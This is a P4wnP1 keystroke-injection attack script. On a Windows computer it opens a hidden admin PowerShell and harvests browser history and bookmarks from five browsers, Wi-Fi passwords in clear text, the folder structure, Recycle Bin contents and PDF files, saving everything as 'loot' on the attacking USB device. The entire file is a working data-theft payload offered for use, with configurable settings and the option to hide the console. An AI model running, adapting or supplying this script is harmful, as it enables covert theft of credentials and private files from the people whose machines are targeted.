/*#######################################################################################################
# Extraction of Browsing History/Bookmarks, Folder Structure, targeted Files and Wifi Passwords          #
# Author: chriskalv                                                                                      #
#													                                                     #
# PREREQUISTES:                                                                                          #
# - Enable the keyboard and USB mass storage on your P4wnP1.                                             #
# - Place Browser_Booty.exe in /tools in order to extract browser data.                                  #
# - Edit global settings below to your liking.                                                           #
########################################################################################################*/


// GLOBAL SETTINGS
// GENERAL
layout("de");			                          // Keyboard layout
hide=true; 			                              // Set to true to hide the console window on the target
exit=true;			                              // Set to true to exit the console once finished
typingSpeed(0,0);		                          // Typing as fast as possible
var usb_drive = "TEMPUSB"                         // The name of the P4wnP1's USB storage device
// FILE EXTRACTION              
var file_type = ["*.pdf"]                         // The types of files to extract
var search_drive = ["C:"]                         // The drives to search for files that match file_type
var user_subfolder1 = ["Music"]                   // The first folder inside the "User" directory that should be inspected
var user_subfolder2 = ["Downloads"]               // The second folder inside the "User" directory that should be inspected

// Definition of other variables, arrays, ...
var delay_time = 5                                // The time to wait before executing the attack in seconds
var ready = "False"                               // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                          // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)               // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                      // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                       // Stop the while loop
            break;
        }
    }
}
function attack() {
  // Open the attack and make paths
    press("GUI r");
    delay(500);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");                    // Hide the console if chosen to do so
    press("CTRL SHIFT ENTER");                                                                // Run as admin
    delay(1000);
    type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name)\n");	      // Replace 'TEMPUSB' with your drive name
    type("$lootPathFiles = $usbPath + \"loot\\files\\sub_folder1\";mkdir $lootPathFiles;");   // Make the full loot path variables and then create them
    type("$lootPathFiles2 = $usbPath + \"loot\\files\\sub_folder2\";mkdir $lootPathFiles2;");
    type("$lootPathFolders = $usbPath + \"loot\\folder_structure\";mkdir $lootPathFolders;");
    type("$lootPathBrowser = $usbPath + \"loot\\browser_data\";mkdir $lootPathBrowser;");
    type("$lootPathWifi = $usbPath + \"loot\\wifi_data\";mkdir $lootPathWifi;");
    delay(100);
  
  // Get files/folder structure of Documents, Downloads, Pictures, Videos and Recycle Bin
    type("tree /F /A ([Environment]::GetFolderPath('MyDocuments')) > $lootPathFolders\\$env:COMPUTERNAME-Documents_Dir.txt;tree /F /A ([Environment]::GetFolderPath('MyPictures')) > $lootPathFolders\\$env:COMPUTERNAME-Pictures_Dir.txt;tree /F /A ([Environment]::GetFolderPath('MyVideos')) > $lootPathFolders\\$env:COMPUTERNAME-Videos_Dir.txt;tree /F /A $env:USERPROFILE\\Downloads > $lootPathFolders\\$env:COMPUTERNAME-Downloads_Dir.txt; $shell = New-Object -com shell.application; $rb = $shell.Namespace(10); $items = @(); $items += $rb.items(); Write-Output '----------------Recycle Bin Start----------------', $items.name, Write-Output '----------------Recycle Bin End----------------' > $lootPathFolders\\$env:COMPUTERNAME-Bin_Dir.txt\n");    
    delay(4000)

  // Get browsing history, bookmarks and download names of all browsers
    // Copying Chrome, Brave, Edge, and Opera files to USB, as the orig. files are locked
    type('cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History" -Destination "$usbPath\\C_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History" -Destination "$usbPath\\B_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History" -Destination "$usbPath\\E_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Opera Software\\Opera Stable\\History" -Destination "$usbPath\\O_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\C_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\B_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\E_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Opera Software\\Opera Stable\\Bookmarks" -Destination "$usbPath\\O_Bookmarks"\n');
    // Copying Firefox seperately because it insists on being difficult
    type('cd $env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\; ls | Sort-Object -Property LastWriteTime | Select-Object -Last 1 | cd; cp -Path "places.sqlite" -Destination "$usbPath\\F_History"\n');
    // Execute the .exe in /tools folder
    type('cd $usbPath\\tools; .\\Browser_Booty.exe > $lootPathBrowser\\$env:COMPUTERNAME-HDB.txt\n');
    //Deletes the database files now that we've extracted all useful information
    type('cd ..; rm * -Include *History; rm * -Include *Bookmarks\n') 
    delay(6000)
  
  // Extract Wifi information/keys
    type("netsh wlan show profiles * > $lootPathWifi\\Known_networks_info.txt;");             // Get all the known netwoks and info about them and save it
    type("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Schlüsselinhalt\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > $lootPathWifi\\wifi_keys.txt;")
	// Make sure to change "Schlüsselinhalt" to "Key Content" on English locale
    delay(2000)
  
  // Copy files of a specified file type in specifies folders
    type("$home_directory = Get-Variable HOME -valueOnly;");                                  // Get the home directory of the current user 
    type("Get-ChildItem $home_directory\\" + user_subfolder1 + " -Recurse -Include " + file_type + " | ForEach-Object ` {copy $_ -Destination $lootPathFiles};");
    type("Get-ChildItem $home_directory\\" + user_subfolder2 + " -Recurse -Include " + file_type + " | ForEach-Object ` {copy $_ -Destination $lootPathFiles2};");
    // type("Get-ChildItem " + search_drive + " -Recurse -Include " + file_type + " | ForEach-Object ` {copy $_ -Destination $lootPathFiles};"");                     // !!THIS MIGHT BE A LOT!!
    type("\n")  
 
    if (exit) { type("exit\n"); }                                                             //Exit the console if chosen to do so
}

delay(delay_time * 100);
check_if_ready();
attack();
